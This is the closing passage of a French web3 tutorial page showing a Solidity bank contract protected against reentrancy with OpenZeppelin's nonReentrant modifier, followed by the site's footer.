+<span class="line"><span style="color: #FF7B72">contract</span><span style="color: #C9D1D9"> </span><span style="color: #FFA657">BankAccount</span><span style="color: #C9D1D9"> </span><span style="color: #FF7B72">is</span><span style="color: #C9D1D9"> </span><span style="color: #FFA657">ReentrancyGuard</span><span style="color: #C9D1D9"> {</span></span>
+<span class="line"><span style="color: #C9D1D9">  </span><span style="color: #FF7B72">using</span><span style="color: #C9D1D9"> </span><span style="color: #FFA657">Address</span><span style="color: #C9D1D9"> </span><span style="color: #FF7B72">for</span><span style="color: #C9D1D9"> </span><span style="color: #FFA657">address</span><span style="color: #C9D1D9"> </span><span style="color: #FF7B72">payable</span><span style="color: #C9D1D9">;</span></span>
+<span class="line"><span style="color: #C9D1D9">  </span><span style="color: #FF7B72">mapping</span><span style="color: #C9D1D9">(</span><span style="color: #79C0FF">address</span><span style="color: #C9D1D9"> </span><span style="color: #FF7B72">=></span><span style="color: #C9D1D9"> </span><span style="color: #79C0FF">uint256</span><span style="color: #C9D1D9">) </span><span style="color: #FF7B72">public</span><span style="color: #C9D1D9"> balanceOf;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C9D1D9">  </span><span style="color: #FF7B72">function</span><span style="color: #C9D1D9"> </span><span style="color: #D2A8FF">deposit</span><span style="color: #C9D1D9">() </span><span style="color: #FF7B72">external</span><span style="color: #C9D1D9"> </span><span style="color: #FF7B72">payable</span><span style="color: #C9D1D9">  {</span></span>
+<span class="line"><span style="color: #C9D1D9">    balanceOf[</span><span style="color: #79C0FF">msg.sender</span><span style="color: #C9D1D9">] </span><span style="color: #FF7B72">+=</span><span style="color: #C9D1D9"> </span><span style="color: #79C0FF">msg</span><span style="color: #C9D1D9">.value;</span></span>
+<span class="line"><span style="color: #C9D1D9">  }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C9D1D9">  </span><span style="color: #FF7B72">function</span><span style="color: #C9D1D9"> </span><span style="color: #D2A8FF">withdraw</span><span style="color: #C9D1D9">() </span><span style="color: #FF7B72">external</span><span style="color: #C9D1D9"> </span><span style="color: #D2A8FF">nonReentrant</span><span style="color: #C9D1D9">{</span></span>
+<span class="line"><span style="color: #C9D1D9">    </span><span style="color: #FF7B72">require</span><span style="color: #C9D1D9">(balanceOf[</span><span style="color: #79C0FF">msg.sender</span><span style="color: #C9D1D9">] </span><span style="color: #FF7B72">></span><span style="color: #C9D1D9"> </span><span style="color: #79C0FF">0</span><span style="color: #C9D1D9">, </span><span style="color: #A5D6FF">"Pas de fond a retirer"</span><span style="color: #C9D1D9">);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C9D1D9">    </span><span style="color: #79C0FF">uint256</span><span style="color: #C9D1D9"> depositedAmount </span><span style="color: #FF7B72">=</span><span style="color: #C9D1D9"> balanceOf[</span><span style="color: #79C0FF">msg.sender</span><span style="color: #C9D1D9">];</span></span>
+<span class="line"><span style="color: #C9D1D9">    </span><span style="color: #FF7B72">payable</span><span style="color: #C9D1D9">(</span><span style="color: #79C0FF">msg.sender</span><span style="color: #C9D1D9">).</span><span style="color: #D2A8FF">sendValue</span><span style="color: #C9D1D9">(depositedAmount);</span></span>
+<span class="line"><span style="color: #C9D1D9">    balanceOf[</span><span style="color: #79C0FF">msg.sender</span><span style="color: #C9D1D9">] </span><span style="color: #FF7B72">=</span><span style="color: #C9D1D9"> </span><span style="color: #79C0FF">0</span><span style="color: #C9D1D9">;</span></span>
+<span class="line"><span style="color: #C9D1D9">    </span></span>
+<span class="line"><span style="color: #C9D1D9">  }</span></span>
+<span class="line"><span style="color: #C9D1D9">}</span></span></code></pre>
+<p>Il suffit de déclarer toutes les méthodes pour lesquelles on veut éviter la ré-entrance possible avec le mot clé: <b>nonReentrant</b>.
+<br><br>Et voilà.
+<br><br>J’espère que ce tutoriel vous a plus. Pour rappel, vous pouvez trouver le code source de cet article <a href="https://github.com/csurbier/tutoriels-developpement-web3" target="_blank">sur mon GitHub.</a></p>
+<style>
+    p { color: white;!important }
+    a { color:darkorange!important}
+  </style>
+                         
+                        </div>
+                    </div>
+
+                </div>
+
+
+            </div>
+        </div>
+    </section>
+    <!-- ##### Blog Area End ##### -->
+		<footer class="footer-area bg-img" style="background-image: url(img/core-img/pattern.png);"> 
+    <div class="footer-content-area "> 
+        <div class="container"> 
+            <div class="row "> 
+             
+                <div class="col-12 col-lg-4 col-md-6"> 
+                    <div class="footer-copywrite-info"> 
+                        <!-- Copywrite -->                                 
+                        <div class="copywrite_text fadeInUp" data-wow-delay="0.2s"> 
+                            <div class="footer-logo"> 
+                                
+                            </div>    
+                                                           
+                            <p>Vous pouvez me retrouver sur :</p> 
+                        </div>                                 
+                        <!-- Social Icon -->                                 
+                        <div class="footer-social-info fadeInUp" data-wow-delay="0.4s"> 
+                           
+                            <a href="https://twitter.com/csurbier"> <i class="fa fa-twitter" aria-hidden="true"></i></a> 
+                            <a href="https://github.com/csurbier"><i class="fa fa-github" aria-hidden="true"></i></a> 
+                            <a href="https://www.malt.fr/profile/christophesurbier"><i class="fa fa-slack" aria-hidden="true"></i></a> 
+                            <a href="https://www.linkedin.com/in/christophesurbier/"><i class="fa fa-linkedin" aria-hidden="true"></i></a> 
+                        </div>                                 
+                    </div>                             
+                </div>                         
+                <div class="col-12 col-lg-3 col-md-6"> 
+                    <div class="contact_info_area d-sm-flex justify-content-between"> 
+                        <!-- Content Info -->                                 
+                        <div class="contact_info mt-x text-center fadeInUp" data-wow-delay="0.3s"> 
+                            
+                        </div>                                 
+                    </div>                             
+                </div>                         
+                <div class="col-12 col-lg-2 col-md-6 "> 
+                    <!-- Content Info -->                             
+                    <div class="contact_info_area d-sm-flex justify-content-between"> 
+                        <div class="contact_info mt-s text-center fadeInUp" data-wow-delay="0.2s"> 
+                           
+                        </div>                                 
+                    </div>                             
+                </div>                         
+                <div class="col-12 col-lg-3 col-md-6 "> 
+                    <div class="contact_info_area d-sm-flex justify-content-between"> 
+                        <!-- Content Info -->                                 
+                        <div class="contact_info mt-s text-center fadeInUp" data-wow-delay="0.4s"> 
+                            
+                        </div>                                 
+                    </div>                             
+                </div>    
+                <div class="col-12" style="font-size: 14px;">
+                    Copyright © 2023. Created with ❤️ in Barcelona. Build proudly with <a style="color:white" href="https://astro.build/" target="_blank"><img style="width:20px" src="https://astro.build/favicon.svg" alt="Astro">Astro</a>
+                </div>                     
+            </div>                     
+        </div>                 
+    </div>             
+</footer>     
+<script src="/js/jquery.min.js"></script>
+<script src="/js/popper.min.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/plugins.js"></script>
+<script src="/js/script.js"></script>
+	</body></html>
